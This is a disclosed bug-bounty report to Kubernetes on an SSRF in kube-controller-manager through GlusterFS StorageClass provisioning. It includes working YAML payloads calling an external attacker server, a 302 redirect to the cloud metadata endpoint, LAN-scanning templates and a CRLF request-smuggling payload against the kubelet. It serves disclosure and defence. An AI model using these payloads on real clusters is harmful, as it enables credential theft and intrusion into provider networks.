# Half-Blind SSRF found in kube/cloud-controller-manager can be upgraded to complete SSRF (fully crafted HTTP requests) in vendor managed k8s service.

## Report Details
- **Report ID**: 776017
- **URL**: https://hackerone.com/reports/776017
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-01-15T22:33:11.684Z
- **Disclosed**: 2020-10-30T21:37:19.120Z

## Reporter
- **Username**: reeverzax
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: kubernetes

## Vulnerability Information
Hello,

## Who we are :

We’re two French security researchers and our respective names are Brice Augras and
Christophe Hauquiert, we worked and found the vulnerability together.

Brice Augras from https://www.groupe-asten.fr/ company - https://hackerone.com/reeverzax
Christophe Hauquiert - https://hackerone.com/hach

## Summary

We recently led some security investigations about Kubernetes product hosted in a managed
service.
By abusing product vulnerability due to implementation context, we would like to bring to your
attention technical details about what we found.
We started an investigation process on multiple managed k8s offers and found quite each time a Critical
Impact vulnerability as this can vary from half-blind SSRF and allow an attacker to perform internal services enumeration inside the distributor perimeter to full SSRF vulnerability .
We're getting in touch with you about the vulnerability you just got aware of two weeks ago from security team we were in touch with.  

## Technical specification : 

- Fake vendor name : **example.com**
- Kubernetes release for half-blind SSRF scenario: **1.14**
- Kubernetes release for complete SSRF vulnerability :  up to **v1.15.3**, **v1.14.6** and **v1.13.10**

We don't know if the previous information regarding k8s release can be useful for you as each distributor seems to manage its own k8s custom cluster release. 
- Attacker server: **https://bzh.ovh** (51.38.238.22)
- Provided file with proof of concept scripts: **PoC.zip**

{F685902}

## Compromission Scenario

Here is the main workflow we followed in order to escape from our customer environment on multiple distributors 
providing k8s managed offer.

Firstly, we created a k8s cluster on distributors managed k8s service.
Mainly, these vendors use the following infrastructure : 

{F685875}

After configuring kubectl binary, we were able to manage our customer cluster provided by **example.com**

When creating a persistent volume claim associated with a custom StorageClass on our
cluster, the provisioning step is handled by the **kube/cloud controller manager** (depending of the release),
we noticed that the process was handled  inside vendor internal perimeter.
We discovered the existence of a half-blind SSRF vulnerability inside multiple
StorageClasses (glusterfs, scaleio, storageos) due to k8s managed context.

This half-blind SSRF can be used us to scan master VPC network and request the different listening services
(Metadata instance, Kubelet, ETCD, etc..) based on the **kube-controller** responses.

Initially, we were only limited to HTTP POST requests as we were unable to retrieve content of
body page if the response code was equal to 200 and not in JSON Content-Type.
But we improved our first payload by combining the previous step with a 302 redirect from an
external server in order to convert POST request to GET request.

In addition to this, if the managed k8s offer service provider was using an old k8s cluster release **AND** allowed customer **kube-controller-manager** logs access, an attacker could interact in a more convenient way by crafting full user-controllable HTTP requests and get full HTTP response.
This was the attack scenario with the most impact. 
Indeed, while we were working on our research project, we managed to perform some of the following actions among different managed k8s providers: Priv esc with credential retrieving via metadata instances, DoS the master instance with HTTP request (unencrypted) on ETCD master instances, etc...
 
## PoC
### PoC n°1 - Half Blind SSRF

While doing some analysis on **glusterFS** storage Class Golang source, we noticed that 
the first HTTP request issued during a Volume creation
(https://github.com/heketi/heketi/blob/master/client/api/go-client/volume.go#L34), **/volumes**
was appended at the end of the user provided URL in **resturl** parameter.
In order to remove the end of this unwanted path, we used the **#** trick in the resturl
parameter.
Here is the first YAML payload we used as evidence for the half-blind SSRF vulnerability:

```yaml
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
name: poc-ssrf
provisioner: kubernetes.io/glusterfs
parameters:
resturl: "http://bzh.ovh:6666/#"
clusterid: "630372ccdc720a92c681fb928f27b53f"
restauthenabled: "true"
restuser: "admin"
secretNamespace: "default"
secretName: "poc-ssrf-secret"
gidMin: "40000"
gidMax: "50000"
volumetype: "replicate:3"
---
apiVersion: v1
data:
key: bXlwYXNzd29yZA==
kind: Secret
metadata:
name: poc-ssrf-secret
namespace: default
type: kubernetes.io/glusterfs
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: poc-ssrf
spec:
accessModes:
- ReadWriteOnce
volumeMode: Filesystem
resources:
requests:
storage: 8Gi
storageClassName: poc-ssrf
```

We executed the payload with kubectl binary, and the kube-controller-manager handled the
creation process and HTTP request:

```bash
kubectl create -f sc-poc.yam
```
The attacker server was put in listening mode on port 6666 in order to handle incoming
POST requests and verify that how the URL could be arbirary controlled by an attacker:

{F685801}

### PoC n°2 : Redirecting POST to GET HTTP request trick

The first request issued by Glusterfs client was a POST type, by doing the following steps,
we were able to convert POST request to GET:

• Storage class uses http://bzh.ovh/redirect.php# as resturl parameter
• https://bzh.ovh/redirect.php endpoint responds with 302 HTTP return code with the
following Location Header http://169.254.169.254 (could be any other internal
resource, this redirected url is used for example purposes)
• As by default Golang net/http library follows redirection and convert POST to GET
with 302 return code, the targeted resource is then requested with a HTTP GET request.

We were able to read HTTP response body on some requests by describing persistent
volume claim object:
```
kubectl describe pvc xxx
```

Or, getting events from Kubernetes cluster with command below:
```
kubectl get event
```
Here is an example of JSON response we were able to retrieve : 

{F685919}

The exploitation process of our vulnerability at this moment was limited due to the
following elements:
- We were not able to inject HTTP headers in the emitted request
- We were not able to perform POST HTTP Request with body parameters (useful to
request key value on ETCD instance running on 2379 PORT if HTTP unencrypted is used)
- We were not able to retrieve response body content when HTTP return code was
200 and not a JSON Content-Type response.


### PoC n°3 : Managed cluster Lan scanning and sensitive data exposure 

At least, as we had the possibility to scan LAN resources, the next step was automation.
Indeed, in order to scan one IP address and one port we had to realize the following tasks:
- Delete previous tested Storage Class
- Delete previous tested Persistent Volume Claim
- Change IP and PORT in sc.yaml
- Create Storage Class with new IP and port
- Create new Persistent Volume Claim
Since the way to scan for one resource was very specific and incompatible with traditional
SSRF exploitation tools or scanners, we decided to create some kind of custom workers in
bash script.
In order to be able to scan 172.16.0.0/12 range faster, we launched 15 simultaneously workers.
The above IP range was chosen just for demonstration purposes and can be adapted to each provider internal IP range. 
 
Each worker was launched the following command:

{F685904}

Here are two additional YAML files that needs to be in the same directory as scanner.sh Bash
script:
```yaml
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
name: {{SC_NAME}}
provisioner: kubernetes.io/glusterfs
parameters:
resturl: "http://{{URL}}#"
clusterid: "630372ccdc720a92c681fb928f27b53f"
restauthenabled: "true"
restuser: "admin"
secretNamespace: "default"
secretName: "heketi-secret"
gidMin: "40000"
gidMax: "50000"
volumetype: "replicate:3"
```
Above is the content of **template_sc.yaml**

```yaml
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: {{PVC_NAME}}
spec:
accessModes:
- ReadWriteOnce
volumeMode: Filesystem
resources:
requests:
storage: 8Gi
storageClassName: {{SC_NAME}}
```
Above is the content of **template_pvc.yaml**

### PoC n°4  : CRLF + smuggling HTTP injection in old Kubernetes cluster releases 

In addition to all the previous steps, we found a more efficient way to retrieve full HTTP
response body content in addition to craft complete HTTP requests that were user controlled.

Unfortunately, the vulnerability requires the following prerequisites:
- Kube Controller Manager logs reachable by the customer
- Kubernetes Cluster version using Golang version <1.12 (See technical requirements chapter for additional information about specific k8s releases concerned)

We still wan't to bring this attack scenario with a PoC as some providers still have some 
customers using one of these “deprecated” k8s release.

We realized a first PoC in a local environment to demonstrate the vulnerability.
Here are some technical details about them:
We discovered a vulnerability was existing for the following Golang releases <1.12
(https://github.com/golang/go/issues/30794) that allowed to produce HTTP smuggling/CRLF
attacks.
By combining the Half-Blind SSRF described above and the vulnerability, we were able to send complete
crafted requests, including custom headers, HTTP method, parameters and data that were
going to be executed by the **kube-controller-manager**.

In addition to previous steps, we were able to retrieve full HTTP responses from interal requested resource. 

We deployed a local environment simulating Kubernetes exchanges between the GlusterFS
Go client and a fake targeted server. (PoC is http-smuggling-poc in the zip file).

Here is an example of a working StorageClass resturl parameter payload performing an HTTP
smuggling attack + CRLF during provisioning step in order to leak response content in kube-
controller logs:

Here is an example of a working StorageClass **resturl** parameter payload allowing to perform this kind of attack scenario : 

```
http://172.31.X.1:10255/healthz? HTTP/1.1\r\nConnection: keep-
alive\r\nHost: 172.31.X.1:10255\r\nContent-Length: 1\r\n\r\n1\r\nGET /pods? HTTP/1.1\r\nHost: 172.31.X.1:10255\r\n\r\n
```

Here is the complete HTTP response that was leaking inside the **lube-controller-manage** logs :

{F685896}

## Impact

## Impact Analysis

This was quite hard for us to evaluate how hard the impact was for these two attack vectors. 
Indeed, as they are vendor dependent, we preferred to take the lowest score we found about impact analysis regarding to whom we reported the security problematic.
Feel free to exchange with us about the **CVSS** score about you consider for this vulnerability as this seems to be related to managed context k8s environment.

From the various distributors we led research on, we noticed that this could lead to  the following impact analysis : 
 
### Integrity

- Lateral movement with cloud steal credentials (from metadata API)
- Remote command execution by using these credentials
- Reproducing above scenario in an IDOR way with other resources discovered in LAN area.

### Confidentiality

- Information gathering by LAN scannin (ssh version, http server versions, ...)
- Instances and infrastructure information by requesting internal API like metadata APIs (http://169.254.169.254, ...)
- Customers data leak, by using cloud credentials

### Availability

All the post-exploitation scenarios about **integrity** attack vectors could be used to perform disruptive scenarios and make master instance from our customer perimeter or other customer unavailable. 

Indeed, as we are in managed k8senvironment and considering the integrity impact, we can imagine lots of scenarios that can impact availability. An additional example could be to corrupt ETCD database or perform critical call to kubernetes API.

Best Regards, 

Brice Augras from @Groupe-Asten
Christophe Hauquiert

## Attachments
- screen1.png
- screen2.png
- CRLF.png
- PoC.zip
- worker.png
- json_response.png
